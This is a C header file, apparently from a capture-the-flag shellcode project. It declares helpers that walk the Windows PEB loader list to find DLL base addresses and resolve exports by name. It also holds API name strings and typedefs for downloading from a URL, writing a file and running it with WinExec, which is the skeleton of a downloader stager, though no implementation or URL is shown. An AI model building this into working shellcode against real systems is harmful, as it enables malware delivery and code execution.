#ifndef PEB_HELPER_H
#define PEB_HELPER_H

#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <windows.h>
#include <wininet.h>
#include <winternl.h>

#pragma clang section data = "payload_data"

static WCHAR kernel32[] = L"kernel32.dll";
static WCHAR kernelbase[] = L"kernelbase.dll";
static WCHAR user32[] = L"user32.dll";
static WCHAR ntdll[] = L"ntdll.dll";
static WCHAR wininet[] = L"wininet.dll";
static WCHAR agent_name[] = L"ctf-trick/1.0";

static char create_file_s[] = "CreateFileW";
static char write_file_s[] = "WriteFile";
static char close_file_s[] = "CloseHandle";
static char load_library_s[] = "LoadLibraryW";
static char free_library_s[] = "FreeLibrary";
static char exit_process_s[] = "ExitProcess";
static char open_s[] = "InternetOpenW";
static char open_url_s[] = "InternetOpenUrlW";
static char query_info_s[] = "HttpQueryInfoW";
static char read_file_s[] = "InternetReadFile";
static char close_handle_s[] = "InternetCloseHandle";
static char winexec_s[] = "WinExec";

#pragma clang section data = ""

typedef HMODULE (WINAPI *load_libraryw_fn) (LPCWSTR);
typedef BOOL (WINAPI *free_library_fn) (HMODULE);
typedef HINTERNET (WINAPI *openw_fn) (LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *openurlw_fn) (HINTERNET, LPCWSTR, LPCWSTR, DWORD,
                                         DWORD, DWORD_PTR);
typedef BOOL (WINAPI *queryinfow_fn) (HINTERNET, DWORD, LPVOID, LPDWORD,
                                      LPDWORD);
typedef BOOL (WINAPI *read_file_fn) (HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *close_handle_fn) (HINTERNET);
typedef HANDLE (WINAPI *create_filew_fn) (LPCWSTR, DWORD, DWORD,
                                          LPSECURITY_ATTRIBUTES, DWORD, DWORD,
                                          HANDLE);
typedef BOOL (WINAPI *write_file_fn) (HANDLE, LPCVOID, DWORD, LPDWORD,
                                      LPOVERLAPPED);
typedef BOOL (WINAPI *close_file_fn) (HANDLE);
typedef UINT (WINAPI *winexec_fn) (LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct
{
  uint64_t user32;
  uint64_t ntdll;
  uint64_t kernel32;
  uint64_t kernelbase;
  uint64_t wininet;
} dll_base;

// 0x138 bytes (sizeof)
typedef struct
{
  struct _LIST_ENTRY InLoadOrderLinks;           // 0x0
  struct _LIST_ENTRY InMemoryOrderLinks;         // 0x10
  struct _LIST_ENTRY InInitializationOrderLinks; // 0x20
  VOID *DllBase;                                 // 0x30
  VOID *EntryPoint;                              // 0x38
  ULONG SizeOfImage;                             // 0x40
  struct _UNICODE_STRING FullDllName;            // 0x48
  struct _UNICODE_STRING BaseDllName;            // 0x58
  // there are some more, but we don't need those
} my_LDR_DATA_TABLE_ENTRY;

typedef enum
{
  NOT_FOUND,
  FUNC_DIRECT,
  FUNC_FORWARDER
} func_result;

static bool my_memicmp (void *dst, void *src, size_t size);
static bool my_memcmp (void *dst, void *src, size_t size);
static uint64_t my_strlen (void *dst);
static uint32_t search_func (uint64_t dll_base, char *func_name,
                             PIMAGE_EXPORT_DIRECTORY export_table);
static func_result get_func (uint64_t dll_base, char *func_name,
                             uint64_t *result);
static void get_dll_base (struct _PEB_LDR_DATA *ldr, dll_base *bases);

#endif
